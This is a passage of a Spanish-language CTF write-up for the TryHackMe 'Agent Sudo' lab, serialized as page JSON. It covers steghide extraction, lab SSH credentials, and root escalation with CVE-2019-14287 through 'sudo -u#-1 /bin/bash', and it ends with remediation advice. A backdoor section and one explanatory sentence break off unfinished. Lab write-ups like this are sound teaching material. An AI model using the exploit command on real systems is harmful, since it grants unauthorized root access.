"},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"Area51"}]},{"type":"text","value":"."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"¿Obtuvimos la contraseña de SSH? Resulta no ser valida. Si esta imagen contiene un archivo incrustado, probablemente la otra imagen también."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"strings"}]},{"type":"text","value":" revela que la imagen "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"cute-alien.png"}]},{"type":"text","value":" contiene información adicional incrustada."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"strings cute-alien.png | head -n 20 && echo \".....\" && strings cute-alien.png | tail -n 20\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"strings"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cute-alien.png"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" |"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":" head"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 20"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":" && "}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":"echo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \".....\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":" && "}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"strings"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cute-alien.png"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" |"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":" tail"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 20\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"strings:"}]},{"type":"text","value":" Mostrar cadenas de texto legibles para humanos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"head:"}]},{"type":"text","value":" Mostrar las primeras 10 lineas de un archivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-n [numero]:"}]},{"type":"text","value":" Mostrar las primeras lineas."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"tail:"}]},{"type":"text","value":" Mostrar las ultimas 10 lineas de un archivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-n [numero]:"}]},{"type":"text","value":" Mostrar las ultimas lineas."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"strings cute-alien.png | head -n 20 && echo \".....\" && strings cute-alien.png | tail -n 20\n\nJFIF\n , #&')*)\n-0-(0%()(\n((((((((((((((((((((((((((((((((((((((((((((((((((\n$3br\n%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\n        #3R\n&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\n~U,q\n.c@6\n[...]\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"strings cute-alien.png | head -n 20 && echo \".....\" && strings cute-alien.png | tail -n 20\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"JFIF\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":" , #&')*)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"-0-(0%()(\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"((((((((((((((((((((((((((((((((((((((((((((((((((\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"$3br\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"        #3R\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":10},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":11},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"~U,q\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":12},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":".c@6\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":13},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Nota las cadenas de caracteres inusuales en las primeras lineas de la salida. Definitivamente hay información adicional incrustada en la imagen. Compara la salida de "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"strings"}]},{"type":"text","value":" anterior con el de una imagen normal."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"binwalk"}]},{"type":"text","value":" no revela archivos incrustados. Es posible que la información adicional haya sido incrustada mediante métodos de esteganografía."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"¿Recuerdas la frase anterior? Si se hizo uso de esteganografía para ocultar información, esta habrá sido ocultada con la ayuda de una frase secreta. Es posible que esta sea la frase usada. Para extraer esta información haremos uso de "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"steghide"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"steghide extract -sf cute-alien.jpg -p \"Area51\"\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"steghide"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" extract"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -sf"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cute-alien.jpg"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -p"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \"Area51\"\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"steghide:"}]},{"type":"text","value":" Herramienta de esteganografía."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"extract:"}]},{"type":"text","value":" Extraer datos ocultos de un archivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-sf [archivo]:"}]},{"type":"text","value":" Especificar el nombre del archivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-p [frase]:"}]},{"type":"text","value":" Usar la frase secreta."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"steghide extract -sf cute-alien.jpg -p \"Area51\"\n\nwrote extracted data to \"message.txt\".\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"steghide extract -sf cute-alien.jpg -p \"Area51\"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"wrote extracted data to \"message.txt\".\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Alternativamente, si no conocemos la frase secreta para extraer información de un archivo de esteganografía, podemos hacer uso de "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"stegseek"}]},{"type":"text","value":" para "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"crackearla"}]},{"type":"text","value":" haciendo uso de una lista de palabras."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"La información fue extraída en el archivo "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"message.txt"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"Hi james,\n\nGlad you find this message. Your login password is hackerrules!\n\nDon't ask me why the password look cheesy, ask agent R who set this password for you.\n\nYour buddy,\nchris\n","filename":"message.txt","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Hi james,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Glad you find this message. Your login password is hackerrules!\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Don't ask me why the password look cheesy, ask agent R who set this password for you.\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Your buddy,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"chris\n"}]}]}]}]},{"type":"element","tag":"h3","props":{"id":"ssh-1"},"children":[{"type":"text","value":"SSH"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descubrimos el usuario "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"james"}]},{"type":"text","value":" y su contraseña "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"hackerrules!"}]},{"type":"text","value":". Usamos estas credenciales para ingresar al servidor SSH."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Dentro de la carpeta "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"home"}]},{"type":"text","value":" de nuestro usuario encontraremos la bandera del usuario y la imagen "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"Alien_autospy.jpg"}]},{"type":"text","value":" que contiene la respuesta a la pregunta \"What is the incident of the photo called?\". Para copiar la imagen a nuestra maquina local puedes usar el comando "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"scp james@10.10.195.209/Alien_autospy.jpg ."}]},{"type":"text","value":" en una nueva terminal y luego ingresar la contraseña de "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"james"}]},{"type":"text","value":"."}]},{"type":"element","tag":"h2","props":{"id":"escalada-de-privilegios"},"children":[{"type":"text","value":"Escalada de privilegios"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Enumeramos el usuario actual. Una de las primeras cosas que debemos hacer en CTFs cuando obtenemos un "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"foothold"}]},{"type":"text","value":" en la maquina objetivo es ingresar el comando "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo -ll"}]},{"type":"text","value":" (en este caso deberemos usar "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo -l"}]},{"type":"text","value":" por razones que explicare mas adelante)."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"james@agent-sudo:~$ sudo -l\n\n[sudo] password for james: hackerrules!\nMatching Defaults entries for james on agent-sudo:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser james may run the following commands on agent-sudo:\n    (ALL, !root) /bin/bash\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"james@agent-sudo:~$ sudo -l\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[sudo] password for james: hackerrules!\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Matching Defaults entries for james on agent-sudo:\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"User james may run the following commands on agent-sudo:\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"    (ALL, !root) /bin/bash\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"sudo:"}]},{"type":"text","value":" Ejecutar comandos como otro usuario."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-l:"}]},{"type":"text","value":" Listar los privilegios del usuario invocador (si no se especifica con la opción -U)."}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Aunque la salida del comando "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo -ll"}]},{"type":"text","value":" tiene un formato mas legible que "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo -l"}]},{"type":"text","value":", la linea "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"(ALL, !root) /bin/bash"}]},{"type":"text","value":" sera clave para identificar la vulnerabilidad."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"La salida del comando anterior puede resultar poco clara, pero esta nos informa que el usuario "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"james"}]},{"type":"text","value":" puede ejecutar el comando "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"/bin/bash"}]},{"type":"text","value":" como cualquier usuario excepto "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"root"}]},{"type":"text","value":". Parece seguro ¿No? En realidad existe un CVE especifico para esta situación que nos permitirá escalar nuestros privilegios a root."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Para identificar esta vulnerabilidad podemos buscar la frase "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"(ALL, !root) /bin/bash"}]},{"type":"text","value":" (¿No te parece inusual o demasiado especifica?) en el motor de búsqueda de tu preferencia y se nos apuntara al CVE-2019-14287. Todas las versiones de Sudo anteriores a 1.8.28 presentan una falla en la ejecución de comandos con un User ID (UID) arbitrario.  Alternativamente, podemos usar herramientas de enumeración como "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"linpeas"}]},{"type":"text","value":" o "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"LinEnum"}]},{"type":"text","value":" para identificar que la versión de sudo es vulnerable a este CVE."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Podemos comprobar que la versión de sudo presente en la maquina objetivo es vulnerable a este CVE."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"james@agent-sudo:~$ sudo --version\n\nSudo version 1.8.21p2\nSudoers policy plugin version 1.8.21p2\nSudoers file grammar version 46\nSudoers I/O plugin version 1.8.21p2\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"james@agent-sudo:~$ sudo --version\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Sudo version 1.8.21p2\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Sudoers policy plugin version 1.8.21p2\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Sudoers file grammar version 46\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Sudoers I/O plugin version 1.8.21p2\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Para explicar mejor esta vulnerabilidad, es necesario saber que el usuario root siempre tendrá un UID de 0 y que un usuario en Linux también puede ser referenciado directamente haciendo uso de su UID. Por ejemplo, tanto el comando "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"id root"}]},{"type":"text","value":" como "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"id 0"}]},{"type":"text","value":" mostraran los identificadores del usuario root. En el caso del comando "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo"}]},{"type":"text","value":", la opción "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"-u"}]},{"type":"text","value":" (usada para ejecutar un comando como otro usuario) admite UIDs haciendo uso del formato "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"#uid"}]},{"type":"text","value":". De esta forma podríamos ejecutar un comando como root haciendo uso de "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo -u#0 [comando]"}]},{"type":"text","value":"."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"La vulnerabilidad reside en el hecho de que un UID . Esta falla solo afecta a configuraciones de sudo donde alguna entrada en el archivo sudoers permite ejecutar un comando como cualquier usuario excepto root."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"sudo -u#-1 /bin/bash\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"sudo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -u"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":"#-1 /bin/bash\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"sudo:"}]},{"type":"text","value":" Ejecutar comandos como otro usuario."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-u [usuario]:"}]},{"type":"text","value":" Ejectuar el comando como el usuario especificado."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"james@agent-sudo:~$ sudo -u#-1 /bin/bash\n\nroot@agent-sudo:~# id\nuid=0(root) gid=1000(james) groups=1000(james)\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"james@agent-sudo:~$ sudo -u#-1 /bin/bash\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"root@agent-sudo:~# id\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"uid=0(root) gid=1000(james) groups=1000(james)\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Dentro de la carpeta "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"/root"}]},{"type":"text","value":" encontraremos la bandera de root y la respuesta a la pregunta bonus."}]},{"type":"element","tag":"h2","props":{"id":"persistencia"},"children":[{"type":"text","value":"Persistencia"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Ahora que hemos escalado privilegios a "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"root"}]},{"type":"text","value":", deberiamos de crear un "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"backdoor"}]},{"type":"text","value":" para asegurar la persistencia del ingreso a una cuenta con altos privilegios en esta maquina. Existen distintas formas para crear un "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"backdoor"}]},{"type":"text","value":" que nos permita acceder directamente al usuario "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"root"}]},{"type":"text","value":", pero teniendo en cuenta que muchas de ellas requieren de la posterior interacción de esta cuenta (como iniciar sesión) por parte de otra persona,"}]},{"type":"element","tag":"h2","props":{"id":"resumen-ejecutivo"},"children":[{"type":"text","value":"Resumen ejecutivo"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descripción"}]},{"type":"element","tag":"h2","props":{"id":"remediación"},"children":[{"type":"text","value":"Remediación"}]},{"type":"element","tag":"ol","props":{},"children":[{"type":"element","tag":"li","props":{},"children":[{"type":"text","value":"Evita el uso de contraseñas débiles."}]},{"type":"element","tag":"li","props":{},"children":[{"type":"text","value":"Actualiza "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"sudo"}]},{"type":"text","value":" a la ultima versión disponible haciendo uso del gestor de paquetes de tu sistema operativo."}]}]},{"type":"element","tag":"h2","props":{"id":"conclusiones"},"children":[{"type":"text","value":"Conclusiones"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Este es un desafio relativamente facil. Introduce a los principiantes a la enumeración basica de servicios de red, ataques de fuerza bruta, "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"crackeo"}]},{"type":"text","value":" de contraseñas y metodos basicos de ingenieria inversa. La parte mas complicada es descubrir la pagina oculta haciendo uso de un metodo muy inusual, y realizar esteganografía a las imagenes descargadas (y saber que esto se debe realizar en primer lugar)."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Eventualmente tenemos la oportunidad de explotar el CVE-2019-14287, que aunque pueda resultar peligroso debido a la posibilidad de escalar privilegios con un unico comando, requiere de entradas muy especificas en el archivo sudoers y de una versión de sudo del 2019 (el cual se puede actualizar facilmente con el gestor de paquetes del sistema operativo). Por supuesto, el desafio fue creado poco despues de la divulgación del CVE, pero en un contexto actual esta vulnerabilidad es muy poco probable que este presente."}]},{"type":"element","tag":"style","props":{},"children":[{"type":"text","value":"html .default .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}html .shiki span {color: var(--shiki-default);background: var(--shiki-default-bg);font-style: var(--shiki-default-font-style);font-weight: var(--shiki-default-font-weight);text-decoration: var(--shiki-default-text-decoration);}"}]}],"toc":{"title":"","searchDepth":2,"depth":2,"links":[{"id":"escaneo","depth":2,"text":"Escaneo"},{"id":"enumeración-de-servicios","depth":2,"text":"Enumeración de servicios","children":[{"id":"tcp21","depth":3,"text":"TCP/21"},{"id":"tcp80","depth":3,"text":"TCP/80"}]},{"id":"explotación","depth":2,"text":"Explotación","children":[{"id":"ssh","depth":3,"text":"¿SSH?"},{"id":"ftp","depth":3,"text":"FTP"},{"id":"esteganografía","depth":3,"text":"Esteganografía"},{"id":"crackeo-de-zip","depth":3,"text":"Crackeo de zip"},{"id":"ssh-1","depth":3,"text":"SSH"}]},{"id":"escalada-de-privilegios","depth":2,"text":"Escalada de privilegios"},{"id":"persistencia","depth":2,"text":"Persistencia"},{"id":"resumen-ejecutivo","depth":2,"text":"Resumen ejecutivo"},{"id":"remediación","depth":2,"text":"Remediación"},{"id":"conclusiones","depth":2,"text":"Conclusiones"}]}},"_type":"markdown","_id":"content:writeups:tryhackme-agent-sudo.md","_source":"content","_file":"writeups/tryhackme-agent-sudo.md","_stem":"writeups/tryhackme-agent-sudo","_extension":"md"}],"navigation":[{"title":"Blog","_path":"/blog","children":[{"title":"Como evadir \"portspoof\" con Nmap","_path":"/blog/como-evadir-portspoof-con-nmap"},{"title":"Plantilla de post","_path":"/blog/template"}]},{"title":"Projects","_path":"/projects","children":[{"title":"PEASS Updater","_path":"/projects/peass-updater"}]},{"title":"Writeups","_path":"/writeups","children":[{"title":"Plantilla de writeup","_path":"/writeups/template"},{"title":"TryHackMe | Agent Sudo","_path":"/writeups/tryhackme-agent-sudo"}]}]}